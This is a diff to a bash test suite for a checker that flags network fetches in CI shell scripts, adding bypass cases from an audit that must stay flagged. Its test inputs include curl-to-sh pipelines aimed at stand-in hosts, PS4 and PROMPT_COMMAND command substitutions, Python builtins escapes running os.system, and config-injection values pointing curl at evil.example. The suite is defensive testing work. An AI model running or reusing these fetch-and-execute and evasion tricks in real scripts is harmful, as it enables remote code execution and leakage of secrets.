@@ -4113,7 +4113,7 @@ pdyes d4 "R1c a curl text inside a string constant and a comment of a pure pytho
 pdc d5 <<'EOF'
 MSG='text with curl http://e.example/x'
 EOF
-pdyes d5 "R1d a plain NAME='...curl...' assignment whose variable is named nowhere else"
+pdno d5 "R1d a plain NAME='...curl...' assignment is measured (the unused context is gone)"
 
 # R2: real fetches, each stays measured
 pdc h1 <<'EOF'
@@ -4266,7 +4266,7 @@ check grep -q "names the vendored folder" "$work/pd.out"; check test "$(grep -c 
 PDFN_HEAD='hub_repo_private() {
   local answer
   answer=$(printf '"'"'user = "%s:%s"\n'"'"' "$DOCKERHUB_TEST_USERNAME" "$DOCKERHUB_TEST_PUSH_TOKEN" \
-    | curl -fsS -K - "https://hub.docker.com/v2/repositories/${DH_REPO}/") \
+    | curl -q -fsS -K - "https://hub.docker.com/v2/repositories/${DH_REPO}/") \
     || { echo "::error::cannot read the visibility of ${DH_REPO} from Docker Hub" >&2; return 1; }
   jq -e '"'"'.is_private == true'"'"' >/dev/null 2>&1 <<<"$answer" \
     || { echo "::error::${DH_REPO} is not private on Docker Hub: nothing is pushed" >&2; return 1; }
@@ -4279,29 +4279,185 @@ lrv() {
   printf 'f() {\n  local answer\n%s\n%s\n}\n' "$body" "$use" | pdc "$n"
   pdno "$n" "R4 variant: $title"
 }
-lrv lr1 "a host not on the list (registry.example.org)" '  answer=$(curl -fsS "https://registry.example.org/v2/x")'
-lrv lr2 "a look-alike host (hub.docker.com.evil.example)" '  answer=$(curl -fsS "https://hub.docker.com.evil.example/v2/x")'
-lrv lr3 "a userinfo trick (https://hub.docker.com@evil.example/)" '  answer=$(curl -fsS "https://hub.docker.com@evil.example/")'
-lrv lr4 "http instead of https" '  answer=$(curl -fsS "http://hub.docker.com/v2/x")'
-lrv lr5 "two URL operands" '  answer=$(curl -fsS "https://hub.docker.com/v2/x" "https://hub.docker.com/v2/y")'
-lrv lr6 "-o file redirects the output" '  answer=$(curl -fsS -o out.json "https://hub.docker.com/v2/x")'
-lrv lr7 "-O keeps a file" '  answer=$(curl -fsS -O "https://hub.docker.com/v2/x")'
-lrv lr8 "a > redirect of the output" '  answer=$(curl -fsS "https://hub.docker.com/v2/x" > out.json)'
-lrv lr9 "-L follows redirects" '  answer=$(curl -fsSL "https://hub.docker.com/v2/x")'
-lrv lr10 "-K - fed by echo, not the printf form" '  answer=$(echo url=http://evil.example | curl -fsS -K - "https://hub.docker.com/v2/x")'
-lrv lr11 "-K file" '  answer=$(curl -fsS -K curl.conf "https://hub.docker.com/v2/x")'
-lrv lr12 "--config" '  answer=$(curl -fsS --config curl.conf "https://hub.docker.com/v2/x")'
-lrv lr13 "-d sends data" '  answer=$(curl -fsS -d a=b "https://hub.docker.com/v2/x")'
-lrv lr14 "-X POST" '  answer=$(curl -fsS -X POST "https://hub.docker.com/v2/x")'
-lrv lr15 "-T uploads a file" '  answer=$(curl -fsS -T f "https://hub.docker.com/v2/x")'
-lrv lr16 "a variable as the host" '  answer=$(curl -fsS "https://${HOST}/v2/x")'
-lrv lr17 "the output piped to sh" '  answer=$(curl -fsS "https://hub.docker.com/v2/x" | sh)'
-lrv lr18 "the output piped to bash outside the capture" '  curl -fsS https://hub.docker.com/v2/x | bash'
-lrv lr19 "the captured answer passed to eval" '  answer=$(curl -fsS "https://hub.docker.com/v2/x")' '  eval "$answer"'
-lrv lr20 "the captured answer passed to sh -c" '  answer=$(curl -fsS "https://hub.docker.com/v2/x")' '  sh -c "$answer"'
-lrv lr21 "the captured answer echoed (not a data consumer)" '  answer=$(curl -fsS "https://hub.docker.com/v2/x")' '  echo "$answer"'
-lrv lr22 "curl without the capture" '  curl -fsS "https://hub.docker.com/v2/x"'
-lrv lr23 "a second curl segment to a non-listed host next to the good one" '  answer=$(curl -fsS "https://hub.docker.com/v2/x"; curl -fsS "https://evil.example/y")'
+lrv lr1 "a host not on the list (registry.example.org)" '  answer=$(curl -q -fsS "https://registry.example.org/v2/x")'
+lrv lr2 "a look-alike host (hub.docker.com.evil.example)" '  answer=$(curl -q -fsS "https://hub.docker.com.evil.example/v2/x")'
+lrv lr3 "a userinfo trick (https://hub.docker.com@evil.example/)" '  answer=$(curl -q -fsS "https://hub.docker.com@evil.example/")'
+lrv lr4 "http instead of https" '  answer=$(curl -q -fsS "http://hub.docker.com/v2/x")'
+lrv lr5 "two URL operands" '  answer=$(curl -q -fsS "https://hub.docker.com/v2/x" "https://hub.docker.com/v2/y")'
+lrv lr6 "-o file redirects the output" '  answer=$(curl -q -fsS -o out.json "https://hub.docker.com/v2/x")'
+lrv lr7 "-O keeps a file" '  answer=$(curl -q -fsS -O "https://hub.docker.com/v2/x")'
+lrv lr8 "a > redirect of the output" '  answer=$(curl -q -fsS "https://hub.docker.com/v2/x" > out.json)'
+lrv lr9 "-L follows redirects" '  answer=$(curl -q -fsSL "https://hub.docker.com/v2/x")'
+lrv lr10 "-K - fed by echo, not the printf form" '  answer=$(echo url=http://evil.example | curl -q -fsS -K - "https://hub.docker.com/v2/x")'
+lrv lr11 "-K file" '  answer=$(curl -q -fsS -K curl.conf "https://hub.docker.com/v2/x")'
+lrv lr12 "--config" '  answer=$(curl -q -fsS --config curl.conf "https://hub.docker.com/v2/x")'
+lrv lr13 "-d sends data" '  answer=$(curl -q -fsS -d a=b "https://hub.docker.com/v2/x")'
+lrv lr14 "-X POST" '  answer=$(curl -q -fsS -X POST "https://hub.docker.com/v2/x")'
+lrv lr15 "-T uploads a file" '  answer=$(curl -q -fsS -T f "https://hub.docker.com/v2/x")'
+lrv lr16 "a variable as the host" '  answer=$(curl -q -fsS "https://${HOST}/v2/x")'
+lrv lr17 "the output piped to sh" '  answer=$(curl -q -fsS "https://hub.docker.com/v2/x" | sh)'
+lrv lr18 "the output piped to bash outside the capture" '  curl -q -fsS https://hub.docker.com/v2/x | bash'
+lrv lr19 "the captured answer passed to eval" '  answer=$(curl -q -fsS "https://hub.docker.com/v2/x")' '  eval "$answer"'
+lrv lr20 "the captured answer passed to sh -c" '  answer=$(curl -q -fsS "https://hub.docker.com/v2/x")' '  sh -c "$answer"'
+lrv lr21 "the captured answer echoed (not a data consumer)" '  answer=$(curl -q -fsS "https://hub.docker.com/v2/x")' '  echo "$answer"'
+lrv lr22 "curl without the capture" '  curl -q -fsS "https://hub.docker.com/v2/x"'
+lrv lr23 "a second curl segment to a non-listed host next to the good one" '  answer=$(curl -q -fsS "https://hub.docker.com/v2/x"; curl -q -fsS "https://evil.example/y")'
+
+
+# --- fix round: findings of the audit, each bypass one case ----
+# F1: a bare (( )) arithmetic command runs a command substitution in its body
+pdc f1a <<'EOT'
+(( total = 1 +
+# $(curl http://e.example/x)
+2 ))
+EOT
+pdno f1a "F1 a # line inside a multi-line (( )) command is not a comment, bash runs the substitution"
+
+
+# pdv NAME TITLE FROM TO: the real read (PDFN_HEAD) with the first FROM replaced by TO, which must stay measured
+pdv() { local t=${PDFN_HEAD/"$3"/$4}; printf '%s\n' "$t" | pdc "$1"; pdno "$1" "$2"; }
+# F2: curl's first argument must be -q, so no .curlrc or CURL_HOME config adds a url or an output
+pdv f2a "F2 the real read without -q" 'curl -q -fsS' 'curl -fsS'
+pdv f2b "F2 -q present but not curl's first argument" 'curl -q -fsS' 'curl -fsS -q'
+
+
+# F3: every $ of the URL must sit inside double quotes; an unquoted expansion is split by bash into more options or URLs
+pdv f3a "F3 the URL unquoted with \${DH_REPO}" '"https://hub.docker.com/v2/repositories/${DH_REPO}/"' 'https://hub.docker.com/v2/repositories/${DH_REPO}/'
+pdv f3b "F3 the URL unquoted with \$DH_REPO" '"https://hub.docker.com/v2/repositories/${DH_REPO}/"' 'https://hub.docker.com/v2/repositories/$DH_REPO/'
+pdv f3c "F3 the variable outside the quotes of a split URL" '"https://hub.docker.com/v2/repositories/${DH_REPO}/"' '"https://hub.docker.com/v2/repositories/"${DH_REPO}"/"'
+
+
+# F4: the whole prefix is exactly the printf of the two Docker Hub names, curl its second pipe segment, and no line assigns either name
+pdv f4a "F4 a cat stage after the printf feeds -K -" '| curl -q -fsS -K -' '| cat cfg - | curl -q -fsS -K -'
+pdv f4b "F4 a cat stage before the printf, curl the third segment" 'answer=$(printf' 'answer=$(cat cfg | printf'
+pdv f4c "F4 the printf names other variables (A and B)" '"$DOCKERHUB_TEST_USERNAME" "$DOCKERHUB_TEST_PUSH_TOKEN"' '"$A" "$B"'
+pdv f4d "F4 the two names in swapped order" '"$DOCKERHUB_TEST_USERNAME" "$DOCKERHUB_TEST_PUSH_TOKEN"' '"$DOCKERHUB_TEST_PUSH_TOKEN" "$DOCKERHUB_TEST_USERNAME"'
+printf '%s\n%s\n' "DOCKERHUB_TEST_USERNAME='\"x\\nurl=http://evil.example\"'" "$PDFN_HEAD" | pdc f4e
+pdno f4e "F4 the file assigns DOCKERHUB_TEST_USERNAME a value that adds a config line"
+printf '%s\n%s\n' "DOCKERHUB_TEST_PUSH_TOKEN='\"x\\noutput=out.json\"'" "$PDFN_HEAD" | pdc f4f
+pdno f4f "F4 the file assigns DOCKERHUB_TEST_PUSH_TOKEN a value that adds a config line"
+
+
+# F5: a function or an alias for a command the read uses (or aliases switched on) refuses the read
+printf '%s\n%s\n' 'jq() { bash -c "$1"; }' "$PDFN_HEAD" | pdc f5a
+pdno f5a "F5 jq redefined as a function that runs its argument"
+printf '%s\n%s\n%s\n' "shopt -s expand_aliases" "alias jq='bash -c'" "$PDFN_HEAD" | pdc f5b
+pdno f5b "F5 alias jq with expand_aliases switched on"
+twoc f5c bin/pd.sh $'#!/usr/bin/env bash\ncurl() { /opt/stub/fetch "$@"; }\n' $'#!/usr/bin/env bash\ncurl() { /opt/stub/fetch "$@"; }\n'"$PDFN_HEAD"$'\n'
+pdno f5c "F5 curl redefined as a function (the definition line is not an added line)"
+printf '%s\n%s\n' 'printf() { /opt/stub/print "$@"; }' "$PDFN_HEAD" | pdc f5d
+pdno f5d "F5 printf redefined as a function"
+
+
+# F6: a function defined above the quoted here-document runs the written file later
+pdc f6a <<'EOT'
+run() { sh ./stub.sh; }
+cat >stub.sh <<'EOS'
+curl http://e.example/x | sh
+EOS
+run
+EOT
+pdno f6a "F6 a function defined before the quoted here-document runs the written file"
+
+
+# F7: the unused-assignment context is gone: bash reads PS4 and PROMPT_COMMAND itself, so such a line can run
+pdc f7a <<'EOT'
+set -x
+PS4='$(curl http://e.example/x)'
+echo hi
+EOT
+pdno f7a "F7 PS4 holding a curl substitution, then set -x and a command"
+pdc f7b <<'EOT'
+set -a
+PS4='$(curl http://e.example/x)'
+set -x
+echo hi
+EOT
+pdno f7b "F7 set -a, PS4 holding a curl substitution, set -x"
+pdc f7c <<'EOT'
+set -a
+PROMPT_COMMAND='curl http://e.example/x'
+bash -i
+EOT
+pdno f7c "F7 set -a, PROMPT_COMMAND holding curl, an interactive bash"
+pdc f7d <<'EOT'
+PROMPT_COMMAND='curl http://e.example/x'
+EOT
+pdno f7d "F7 a bare PROMPT_COMMAND assignment holding curl"
+
+
+# F8: the captured NAME is a lowercase non-special variable read only as "$NAME" or "${NAME}" by the one consumer
+pdv f8a 'F8 the answer read as ${answer:-}' '<<<"$answer"' '<<<"${answer:-}"'
+pdv f8b 'F8 the answer read as ${answer[0]}' '<<<"$answer"' '<<<"${answer[0]}"'
+pdv f8c 'F8 indirection ${!k} with eval' '  jq -e' $'  k=answer; eval "${!k}"\n  jq -e'
+pdv f8d "F8 a nameref to the answer" 'local answer' 'local answer; local -n ref=answer'
+pdv f8e "F8 the answer exported" 'local answer' 'local answer; export answer'
+printf '%s\n%s\n' 'set -a' "$PDFN_HEAD" | pdc f8f
+pdno f8f "F8 set -a earlier in the file"
+printf '%s\n%s\n' 'set -x' "${PDFN_HEAD//answer/PS4}" | pdc f8g
+pdno f8g "F8 the capture variable is PS4, with set -x"
+printf '%s\n' "${PDFN_HEAD//answer/PATH}" | pdc f8h
+pdno f8h "F8 the capture variable is PATH"
+printf '%s\n%s\n' "${PDFN_HEAD/local answer/}" $'sh <<EOF\n# $answer\nEOF' | pdc f8i
+pdno f8i "F8 a # line in an unquoted here-document that sh expands (the answer may hold a newline)"
+
+
+# F9: a capture line inside a multi-line eval "..." string is not plain code
+printf '%s\n' "$PDFN_HEAD" | sed -e '3i\  eval "' -e '5a\  "' | pdc f9a
+pdno f9a "F9 the answer line inside a multi-line double-quoted string given to eval"
+
+
+# F10: a pure python program may not reach __builtins__, __dict__, getattr or globals, nor rebind a name it defined
+pdc f10a <<'EOT'
+python3 - <<'PY'
+run = __builtins__.__dict__["exec"]
+run("__import__('os').system('curl http://e.example/x | sh')")
+PY
+EOT
+pdno f10a "F10 exec reached through __builtins__.__dict__"
+pdc f10b <<'EOT'
+python3 - <<'PY'
+globals()["print"] = exec
+print("__import__('os').system('curl http://e.example/x | sh')")
+PY
+EOT
+pdno f10b "F10 a builtin rebound through globals()"
+pdc f10c <<'EOT'
+python3 - <<'PY'
+def f(): pass
+f = eval
+f("__import__('os').system('curl http://e.example/x | sh')")
+PY
+EOT
+pdno f10c "F10 a name the program defined is rebound to eval"
+pdc f10d <<'EOT'
+python3 - <<'PY'
+getattr(__builtins__, "exec")("__import__('os').system('curl http://e.example/x | sh')")
+PY
+EOT
+pdno f10d "F10 exec reached through getattr"
+
+
+# F11: the only consumer of the answer is jq with a literal single-quoted filter and a here-string
+PDJQ='jq -e '"'"'.is_private == true'"'"' >/dev/null 2>&1 <<<"$answer"'
+pdv f11a "F11 sort --compress-program=sh runs the program" "$PDJQ" 'sort --compress-program=sh >/dev/null 2>&1 <<<"$answer"'
+pdv f11b "F11 jq -f reads the filter from a file" "$PDJQ" 'jq -f filter.jq >/dev/null 2>&1 <<<"$answer"'
+pdv f11c "F11 jq with the filter held in a variable" "$PDJQ" 'jq -e "$f" >/dev/null 2>&1 <<<"$answer"'
+pdv f11d "F11 cat as the consumer" "$PDJQ" 'cat >/dev/null 2>&1 <<<"$answer"'
+pdv f11e "F11 echo piped to jq" "$PDJQ" 'echo "$answer" | jq -e . >/dev/null 2>&1'
+
+# F13: the whole line is the one grammar, no other segment before or between
+pdv f13a "F13 a touch segment before the printf stage" 'answer=$(printf' 'answer=$(touch /tmp/example; printf'
+pdv f13b "F13 a touch segment between the printf and the curl after a semicolon" '    | curl -q' '    ; touch /tmp/example; curl -q'
+pdv f13c "F13 a tr stage between the printf and the curl" '| curl -q' '| tr a b | curl -q'
+pdv f13d "F13 no printf at all, a touch before the curl" $'answer=$(printf \'user = "%s:%s"\\n\' "$DOCKERHUB_TEST_USERNAME" "$DOCKERHUB_TEST_PUSH_TOKEN" \\\n    | curl -q -fsS -K - "https://hub.docker.com/v2/repositories/${DH_REPO}/")' 'answer=$(touch /tmp/example; curl -q -fsS "https://hub.docker.com/api")'
+pdv f13e "F13 a command before the capture on the same line" 'answer=$(printf' 'touch /tmp/example; answer=$(printf'
+# F14: the only variable in the URL is DH_REPO, once, after a literal prefix
+pdv f14a "F14 \${GITHUB_TOKEN} in the path" 'repositories/${DH_REPO}/"' 'repositories/${GITHUB_TOKEN}/"'
+pdv f14b "F14 \${DH_REPO} twice in the path" 'repositories/${DH_REPO}/"' 'repositories/${DH_REPO}/${DH_REPO}/"'
+pdv f14c "F14 \$DH_REPO without braces inside the quotes" 'repositories/${DH_REPO}/"' 'repositories/$DH_REPO/"'
+pdv f14d "F14 the variable right after the host slash, no literal prefix" 'v2/repositories/${DH_REPO}/"' '${DH_REPO}"'
+pdv f14e "F14 \${DOCKERHUB_TEST_PUSH_TOKEN} in the path" 'repositories/${DH_REPO}/"' 'repositories/${DOCKERHUB_TEST_PUSH_TOKEN}/"'
 
 echo "pin-age-check: $pass passed, $failn failed"
 test "$failn" -eq 0
